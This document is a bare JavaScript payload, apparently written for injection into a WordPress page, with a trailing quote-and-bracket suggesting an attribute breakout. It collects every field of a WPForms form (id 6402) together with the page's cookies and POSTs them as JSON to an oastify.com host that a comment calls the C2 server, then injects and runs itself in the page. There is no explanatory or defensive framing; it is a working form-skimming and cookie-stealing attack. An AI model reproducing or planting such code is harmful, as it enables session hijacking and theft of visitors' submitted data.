javascript:(function() {
    // Function to extract form data and cookies
    function sendFormData() {
        var formData = {};
        var form = document.getElementById('wpforms-form-6402');

        if (form) {
            form.querySelectorAll('input, select, textarea').forEach(function(input) {
                formData[input.name] = input.value;
            });

            // Extract cookies
            var cookies = document.cookie.split(';').reduce((cookies, cookie) => {
                var [name, value] = cookie.split('=').map(c => c.trim());
                cookies[name] = value;
                return cookies;
            }, {});

            // Send the data and cookies to the C2 server
            var payload = {
                formData: formData,
                cookies: cookies
            };

            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://kc0yatluwfpwgykzme2636pe95fw3mrb.oastify.com', true); // Replace with your C2 server URL
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(payload));
        }
    }

    // Inject the function into the page and execute it
    var script = document.createElement('script');
    script.text = '(' + sendFormData.toString() + ')();';
    document.body.appendChild(script);
})();
">
